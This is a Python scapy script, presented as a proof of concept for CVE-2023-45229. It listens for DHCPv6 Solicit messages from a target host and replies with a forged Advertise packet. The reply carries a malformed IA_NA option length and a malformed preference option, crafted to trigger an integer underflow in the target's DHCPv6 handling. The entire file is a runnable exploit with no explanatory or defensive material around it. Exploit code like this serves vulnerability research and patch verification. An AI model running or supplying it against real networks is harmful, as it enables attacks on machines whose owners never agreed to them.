import struct
import argparse

from scapy.packet import Raw
from scapy.layers.inet import UDP
from scapy.layers.inet6 import IPv6
from scapy.layers.dhcp6 import DHCP6, DHCP6_Solicit, DHCP6_Advertise, DHCP6OptServerId, DHCP6OptClientId, DHCP6OptIA_NA, DHCP6OptIAAddress, DHCP6_Request
from scapy.all import send, sniff


def send_advertise_integer_underflow(args, solicit_pkt):
    ip = IPv6(src=args.src, dst=args.target)
    udp = UDP(sport=solicit_pkt['UDP'].dport, dport=solicit_pkt['UDP'].sport)
    advertise = DHCP6_Advertise(trid=solicit_pkt['DHCP6_Solicit'].trid)
    preference = Raw(b'\x00\x07\x00\x01\xff')
    iana = DHCP6OptIA_NA(iaid=solicit_pkt['DHCP6OptIA_NA'].iaid, T1=solicit_pkt['DHCP6OptIA_NA'].T1, T2=solicit_pkt['DHCP6OptIA_NA'].T2, ianaopts=[DHCP6OptIAAddress(addr='fe80::a1:b2:c3:d4', preflft=0xffffffff, validlft=0xffffffff)], optlen=0xB)

    server_id = DHCP6OptServerId(duid=b'AAAABBBBCCCCDDDDEEEE')
    client_id = DHCP6OptClientId(duid=solicit_pkt['DHCP6OptClientId'].duid)
    pkt = ip/udp/advertise/preference/server_id/client_id/iana
    send(pkt, iface=args.interface)


def main(args):
    while True:
        print('Waiting for DHCPv6 packets...')
        rs = sniff(count=1, iface=args.interface, lfilter=lambda pkt: pkt.haslayer(DHCP6_Solicit) or pkt.haslayer(DHCP6_Request))[0]
        print('Received DHCPv6 message from {} to {}'.format(rs[IPv6].src, rs[IPv6].dst))
        rs.show()

        if rs[IPv6].src == args.target:
            if rs.haslayer(DHCP6_Solicit):
                print('Sending Advertise packet ...')
                send_advertise_integer_underflow(args, rs)
            else:
                print('Ignoring DHCP message')
        else:
            print('Ignoring request from address {}'.format(rs[IPv6].src))



if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Proof of concept for CVE-2023-45229.")
    parser.add_argument('--src', type=str, required=False, help='Source IPv6 address to use')
    parser.add_argument('--target', type=str, required=True, help='Target IPv6 address')
    parser.add_argument('--interface', type=str, required=True, help='Name of the network interface to use')
    args = parser.parse_args()

    main(args)
